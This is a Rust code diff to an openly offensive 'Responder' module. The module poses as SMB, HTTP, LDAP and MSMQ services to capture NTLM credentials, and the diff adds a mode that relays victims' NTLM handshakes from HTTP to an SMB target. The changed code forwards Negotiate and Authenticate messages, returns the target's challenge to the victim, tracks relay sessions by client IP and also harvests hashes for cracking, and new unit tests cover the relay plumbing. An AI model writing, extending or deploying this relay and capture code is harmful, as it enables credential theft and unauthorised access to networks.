@@ -1,21 +1,24 @@
-//! Responder Module
+﻿//! Responder Module
 //!
 //! Implements credential capture via fake services
 //! (SMB, HTTP, LDAP, MSMQ) by listening for NTLM
 //! authentication attempts and extracting credentials.
 
 use crate::{RelayError, Result};
+use std::collections::HashMap;
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::thread;
 use std::time::Duration;
+use tokio::runtime::Handle;
+use tokio::sync::Mutex as TokioMutex;
 use tracing::{debug, error, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // NTLM Protocol Constants
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// NTLM signature: "NTLMSSP\0"
 const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";
@@ -47,9 +50,9 @@ fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // NTLM Message Parsing
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Parsed NTLM Negotiate message
 #[derive(Debug, Clone)]
@@ -223,9 +226,9 @@ fn build_ntlm_challenge(challenge: [u8; 8], target_name: &str) -> Vec<u8> {
     msg
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // HTTP NTLM Authentication
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Parse NTLM token from HTTP Authorization header
 fn parse_http_auth_header(header: &str) -> Option<Vec<u8>> {
@@ -249,9 +252,9 @@ fn base64_encode(data: &[u8]) -> String {
     STANDARD.encode(data)
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Responder Configuration
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Responder configuration
 #[derive(Debug, Clone)]
@@ -319,16 +322,33 @@ impl CapturedCredential {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Responder Implementation
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// Responder for credential capture
+/// Type alias for the thread-safe map of pending relay sessions keyed by client IP.
+type PendingRelays = Arc<std::sync::Mutex<HashMap<String, (u64, Vec<u8>)>>>;
+
+/// Bridge between synchronous responder threads and the async NtlmRelay engine.
+#[derive(Clone)]
+struct RelayBridge {
+    relay: Arc<TokioMutex<crate::relay::NtlmRelay>>,
+    handle: Handle,
+}
+
+/// Responder for credential capture and NTLM relay
 pub struct Responder {
     config: ResponderConfig,
     running: Arc<AtomicBool>,
     captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
     threads: Vec<thread::JoinHandle<()>>,
+    /// Optional relay bridge — when set, the HTTP responder relays
+    /// NTLM tokens through the async relay engine instead of capturing them.
+    relay: Option<RelayBridge>,
+    /// Maps client IP -> (relay_id, target_challenge) for session continuity
+    /// across NTLM's three-step handshake over separate TCP connections.
+    /// The challenge bytes are stored so we can include them in hash harvesting.
+    pending_relays: PendingRelays,
 }
 
 impl Responder {
@@ -339,7 +359,21 @@ impl Responder {
             running: Arc::new(AtomicBool::new(false)),
             captured: Arc::new(std::sync::Mutex::new(Vec::new())),
             threads: Vec::new(),
+            relay: None,
+            pending_relays: Arc::new(std::sync::Mutex::new(HashMap::new())) as PendingRelays,
         }
+    }
+
+    /// Attach an async relay engine to this responder.
+    /// When set, the HTTP responder will forward NTLM Negotiate/Authenticate
+    /// through the relay instead of capturing credentials locally.
+    /// The `handle` must be a handle to the tokio runtime where the relay runs.
+    pub fn set_relay(
+        &mut self,
+        relay: Arc<TokioMutex<crate::relay::NtlmRelay>>,
+        handle: Handle,
+    ) {
+        self.relay = Some(RelayBridge { relay, handle });
     }
 
     /// Start the responder
@@ -369,9 +403,13 @@ impl Responder {
                 .clone()
                 .unwrap_or_else(|| "1122334455667788".to_string());
             let captured = Arc::clone(&self.captured);
+            let relay = self.relay.clone();
+            let pending_relays = Arc::clone(&self.pending_relays);
 
             let handle = thread::spawn(move || {
-                if let Err(e) = Self::run_http_server(running, &listen_ip, &challenge, captured) {
+                if let Err(e) = Self::run_http_server(
+                    running, &listen_ip, &challenge, captured, relay, pending_relays,
+                ) {
                     error!("HTTP server error: {}", e);
                 }
             });
@@ -477,17 +515,19 @@ impl Responder {
         &self.config
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
     // HTTP Server Implementation
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
 
     fn run_http_server(
         running: Arc<AtomicBool>,
         listen_ip: &str,
         challenge: &str,
         captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+        relay: Option<RelayBridge>,
+        pending_relays: PendingRelays,
     ) -> Result<()> {
-        let addr = format!("{}:80", listen_ip);
+        let addr = crate::utils::format_addr(listen_ip, 80);
         let listener = TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind HTTP port 80: {}", e)))?;
 
@@ -509,6 +549,8 @@ impl Responder {
                         peer.ip().to_string(),
                         challenge_bytes,
                         &captured,
+                        &relay,
+                        &pending_relays,
                     ) {
                         debug!("HTTP client handling error: {}", e);
                     }
@@ -532,6 +574,8 @@ impl Responder {
         client_ip: String,
         challenge: [u8; 8],
         captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+        relay: &Option<RelayBridge>,
+        pending_relays: &PendingRelays,
     ) -> Result<()> {
         stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
         stream.set_write_timeout(Some(Duration::from_secs(5))).ok();
@@ -552,70 +596,208 @@ impl Responder {
         {
             match parse_ntlm_type(&ntlm_data) {
                 Some(NtlmMessageType::Negotiate) => {
-                    // Send challenge
-                    let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
-                    let b64_challenge = base64_encode(&challenge_msg);
+                    if let Some(bridge) = relay {
+                        // --- RELAY MODE: forward Negotiate to target via relay engine ---
+                        let ntlm_owned = ntlm_data.to_vec();
+                        let bridge = bridge.clone();
+                        let result = bridge.handle.block_on(async move {
+                            let mut relay = bridge.relay.lock().await;
+                            relay.relay_negotiate(&ntlm_owned).await
+                        });
 
-                    let response = format!(
-                        "HTTP/1.1 401 Unauthorized\r\n\
-                             WWW-Authenticate: NTLM {}\r\n\
-                             Content-Length: 0\r\n\
-                             Connection: close\r\n\
-                             \r\n",
-                        b64_challenge
-                    );
+                        match result {
+                            Ok((relay_id, target_challenge)) => {
+                                // Store relay_id + challenge by client IP for the Authenticate step
+                                pending_relays
+                                    .lock()
+                                    .unwrap_or_else(|e| {
+                                        warn!("Mutex poisoned in Responder — recovering data");
+                                        e.into_inner()
+                                    })
+                                    .insert(client_ip.clone(), (relay_id, target_challenge.clone()));
 
-                    stream.write_all(response.as_bytes()).ok();
+                                // Send the target's challenge back to victim
+                                let b64_challenge = base64_encode(&target_challenge);
+                                let response = format!(
+                                    "HTTP/1.1 401 Unauthorized\r\n\
+                                         WWW-Authenticate: NTLM {}\r\n\
+                                         Content-Length: 0\r\n\
+                                         Connection: close\r\n\
+                                         \r\n",
+                                    b64_challenge
+                                );
+                                stream.write_all(response.as_bytes()).ok();
+                                info!(
+                                    "Relayed NTLM Negotiate to target (relay_id={}) from {}",
+                                    relay_id, client_ip
+                                );
+                            }
+                            Err(e) => {
+                                warn!(
+                                    "Relay negotiate failed for {}: {}",
+                                    client_ip, e
+                                );
+                                let response = "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                                stream.write_all(response.as_bytes()).ok();
+                            }
+                        }
+                    } else {
+                        // --- CAPTURE MODE: send fixed challenge ---
+                        let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
+                        let b64_challenge = base64_encode(&challenge_msg);
+
+                        let response = format!(
+                            "HTTP/1.1 401 Unauthorized\r\n\
+                                 WWW-Authenticate: NTLM {}\r\n\
+                                 Content-Length: 0\r\n\
+                                 Connection: close\r\n\
+                                 \r\n",
+                            b64_challenge
+                        );
+                        stream.write_all(response.as_bytes()).ok();
+                    }
                     return Ok(());
                 }
                 Some(NtlmMessageType::Authenticate) => {
-                    // Extract credentials
-                    if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
-                        let cred = CapturedCredential {
-                            client_ip,
-                            username: auth.username,
-                            domain: auth.domain,
-                            challenge: bytes_to_hex(&challenge),
-                            lm_response: bytes_to_hex(&auth.lm_response),
-                            nt_response: bytes_to_hex(&auth.nt_response),
-                            protocol: "HTTP".to_string(),
-                            timestamp: chrono::Utc::now(),
-                        };
-
-                        info!(
-                            "Captured NTLM credentials: {}\\{} via HTTP",
-                            cred.domain, cred.username
-                        );
-
-                        captured
+                    if let Some(bridge) = relay {
+                        // --- RELAY MODE: forward Authenticate to target ---
+                        let pending = pending_relays
                             .lock()
                             .unwrap_or_else(|e| {
                                 warn!("Mutex poisoned in Responder — recovering data");
                                 e.into_inner()
                             })
-                            .push(cred);
-                    }
+                            .remove(&client_ip);
 
-                    // Send final response
-                    let response =
-                        "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
-                    stream.write_all(response.as_bytes()).ok();
+                        match pending {
+                            Some((relay_id, challenge_bytes)) => {
+                                let ntlm_owned = ntlm_data.to_vec();
+                                let bridge = bridge.clone();
+                                let result = bridge.handle.block_on(async move {
+                                    let mut relay = bridge.relay.lock().await;
+                                    relay.relay_authenticate(relay_id, &ntlm_owned).await
+                                });
+
+                                match result {
+                                    Ok(session) => {
+                                        info!(
+                                            "HTTP->SMB relay succeeded: {}\\{} (target: {})",
+                                            session.username,
+                                            session.domain,
+                                            session.target.address
+                                        );
+
+                                        // Also capture the credential for hash harvesting
+                                        if let Ok(Some(auth)) =
+                                            std::panic::catch_unwind(|| {
+                                                parse_ntlm_authenticate(&ntlm_data)
+                                            })
+                                        {
+                                            let cred = CapturedCredential {
+                                                client_ip,
+                                                username: auth.username,
+                                                domain: auth.domain,
+                                                challenge: bytes_to_hex(
+                                                    &challenge_bytes[24..32],
+                                                ),
+                                                lm_response: bytes_to_hex(&auth.lm_response),
+                                                nt_response: bytes_to_hex(&auth.nt_response),
+                                                protocol: "HTTP->SMB".to_string(),
+                                                timestamp: chrono::Utc::now(),
+                                            };
+                                            captured
+                                                .lock()
+                                                .unwrap_or_else(|e| {
+                                                    warn!(
+                                                        "Mutex poisoned in Responder — recovering data"
+                                                    );
+                                                    e.into_inner()
+                                                })
+                                                .push(cred);
+                                        }
+
+                                        let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                                        stream.write_all(response.as_bytes()).ok();
+                                    }
+                                    Err(e) => {
+                                        warn!(
+                                            "Relay authenticate failed for {} (relay_id={}): {}",
+                                            client_ip, relay_id, e
+                                        );
+                                        let response = "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                                        stream.write_all(response.as_bytes()).ok();
+                                    }
+                                }
+                            }
+                            None => {
+                                warn!(
+                                    "No pending relay for {} — sending initial challenge",
+                                    client_ip
+                                );
+                                // Fall back to capture mode challenge
+                                let challenge_msg =
+                                    build_ntlm_challenge(challenge, "DOMAIN");
+                                let b64_challenge = base64_encode(&challenge_msg);
+                                let response = format!(
+                                    "HTTP/1.1 401 Unauthorized\r\n\
+                                         WWW-Authenticate: NTLM {}\r\n\
+                                         Content-Length: 0\r\n\
+                                         Connection: close\r\n\
+                                         \r\n",
+                                    b64_challenge
+                                );
+                                stream.write_all(response.as_bytes()).ok();
+                            }
+                        }
+                    } else {
+                        // --- CAPTURE MODE: extract and store credentials ---
+                        if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
+                            let cred = CapturedCredential {
+                                client_ip,
+                                username: auth.username,
+                                domain: auth.domain,
+                                challenge: bytes_to_hex(&challenge),
+                                lm_response: bytes_to_hex(&auth.lm_response),
+                                nt_response: bytes_to_hex(&auth.nt_response),
+                                protocol: "HTTP".to_string(),
+                                timestamp: chrono::Utc::now(),
+                            };
+
+                            info!(
+                                "Captured NTLM credentials: {}\\{} via HTTP",
+                                cred.domain, cred.username
+                            );
+
+                            captured
+                                .lock()
+                                .unwrap_or_else(|e| {
+                                    warn!("Mutex poisoned in Responder — recovering data");
+                                    e.into_inner()
+                                })
+                                .push(cred);
+                        }
+
+                        // Send final response
+                        let response =
+                            "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                        stream.write_all(response.as_bytes()).ok();
+                    }
                     return Ok(());
                 }
                 _ => {}
             }
         }
 
-        // Request authentication
+        // No NTLM auth header — request authentication
         let response = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
         stream.write_all(response.as_bytes()).ok();
 
         Ok(())
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
     // SMB Server Implementation
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
 
     fn run_smb_server(
         running: Arc<AtomicBool>,
@@ -623,7 +805,7 @@ impl Responder {
         challenge: &str,
         captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
     ) -> Result<()> {
-        let addr = format!("{}:445", listen_ip);
+        let addr = crate::utils::format_addr(listen_ip, 445);
         let listener = TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port 445: {}", e)))?;
 
@@ -803,9 +985,9 @@ impl Drop for Responder {
 }
 
 impl Responder {
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
     // MSMQ Server
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
 
     fn run_msmq_server(
         running: Arc<AtomicBool>,
@@ -813,7 +995,7 @@ impl Responder {
         challenge: &str,
         captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
     ) -> Result<()> {
-        let addr = format!("{}:1801", listen_ip);
+        let addr = crate::utils::format_addr(listen_ip, 1801);
         let listener = TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind MSMQ port 1801: {}", e)))?;
 
@@ -929,9 +1111,9 @@ impl Responder {
         Ok(())
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
     // LDAP Server (NTLM capture via LDAP SASL bind)
-    // ═══════════════════════════════════════════════════════
+    // =======================================================
 
     fn run_ldap_server(
         running: Arc<AtomicBool>,
@@ -939,12 +1121,13 @@ impl Responder {
         challenge: &str,
         captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
     ) -> Result<()> {
-        let listener = std::net::TcpListener::bind(format!("{}:389", listen_ip))
+        let addr = crate::utils::format_addr(listen_ip, 389);
+        let listener = std::net::TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind LDAP: {}", e)))?;
 
         listener.set_nonblocking(true).ok();
 
-        info!("LDAP responder listening on {}:389", listen_ip);
+        info!("LDAP responder listening on {addr}");
 
         for stream in listener.incoming() {
             if !running.load(Ordering::SeqCst) {
@@ -1152,9 +1335,9 @@ fn build_rpc_bind_ack(ntlm_challenge: &[u8], assoc_group: u32) -> Vec<u8> {
     pdu
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Helper Functions
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Convert hex string to bytes
 fn hex_str_to_bytes(s: &str) -> Option<[u8; 8]> {
@@ -1175,9 +1358,9 @@ fn bytes_to_hex(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02X}", b)).collect()
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // LDAP BER helpers for NTLM SASL bind responder
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 #[derive(Debug, Clone)]
 struct LdapSaslBind {
@@ -1553,4 +1736,63 @@ mod tests {
         let decoded = base64_decode(&encoded).unwrap();
         assert_eq!(data.to_vec(), decoded);
     }
+
+    #[test]
+    fn test_responder_relay_default_none() {
+        let responder = Responder::new(ResponderConfig::default());
+        assert!(responder.relay.is_none());
+        assert!(responder.pending_relays.lock().unwrap().is_empty());
+    }
+
+    #[test]
+    fn test_responder_set_relay() {
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let relay_config = crate::relay::RelayConfig::default();
+        let ntlm_relay = crate::relay::NtlmRelay::new(relay_config);
+        let shared = Arc::new(TokioMutex::new(ntlm_relay));
+
+        let mut responder = Responder::new(ResponderConfig::default());
+        responder.set_relay(shared, rt.handle().clone());
+
+        assert!(responder.relay.is_some());
+    }
+
+    #[test]
+    fn test_relay_bridge_clone() {
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let relay_config = crate::relay::RelayConfig::default();
+        let ntlm_relay = crate::relay::NtlmRelay::new(relay_config);
+        let shared = Arc::new(TokioMutex::new(ntlm_relay));
+
+        let bridge = RelayBridge {
+            relay: shared.clone(),
+            handle: rt.handle().clone(),
+        };
+        let bridge2 = bridge.clone();
+
+        assert!(Arc::ptr_eq(&bridge.relay, &bridge2.relay));
+    }
+
+    #[test]
+    fn test_pending_relays_insert_and_remove() {
+        let pending: PendingRelays = Arc::new(std::sync::Mutex::new(HashMap::new()));
+        let key = "192.168.1.100".to_string();
+        let challenge = vec![0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
+
+        {
+            let mut map = pending.lock().unwrap();
+            map.insert(key.clone(), (42u64, challenge.clone()));
+        }
+
+        {
+            let mut map = pending.lock().unwrap();
+            let entry = map.remove(&key);
+            assert!(entry.is_some());
+            let (relay_id, stored_challenge) = entry.unwrap();
+            assert_eq!(relay_id, 42);
+            assert_eq!(stored_challenge, challenge);
+            assert!(map.is_empty());
+        }
+    }
+
 }
